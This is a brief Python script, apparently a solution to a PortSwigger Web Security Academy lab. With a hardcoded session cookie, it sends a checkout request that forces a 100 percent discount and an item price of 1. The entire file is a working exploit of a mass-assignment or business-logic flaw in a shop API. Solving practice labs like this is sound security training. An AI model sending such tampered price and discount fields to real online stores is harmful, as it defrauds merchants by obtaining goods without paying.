import requests

lab_url = 'https://0ae9009304951d4f81493915004d005f.web-security-academy.net/api/checkout'

cookies = {"session": "omSQYyWOo5f1itCud5ww5TPCdHhiiL1a"}

data = {
    "chosen_discount": {
        "percentage": 100
    },
    "chosen_products": [{
        "product_id": "1",
        "quantity": 1,
        "item_price": 1  
    }]
}

response = requests.post(url=lab_url, cookies=cookies, json=data)
print(response)